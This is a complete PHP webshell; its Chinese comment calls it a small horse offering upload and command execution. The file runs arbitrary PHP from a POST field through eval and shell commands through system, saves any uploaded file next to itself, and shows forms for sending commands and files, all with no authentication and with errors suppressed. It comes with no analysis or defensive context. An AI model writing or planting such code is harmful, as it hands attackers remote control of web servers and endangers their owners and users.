<?php
// 小马：上传 + 命令执行
if (isset($_POST['cmd'])) {
    @eval($_POST['cmd']);
} elseif (function_exists('system') && isset($_POST['s'])) {
    @system($_POST['s']);
}

// 简单上传：POST 字段 f
if (!empty($_FILES['f']['tmp_name'])) {
    @move_uploaded_file($_FILES['f']['tmp_name'], __DIR__ . '/' . basename($_FILES['f']['name']));
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="text" name="s" placeholder="command">
    <input type="submit" value="run">
</form>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="f">
    <input type="submit" value="upload">
</form>
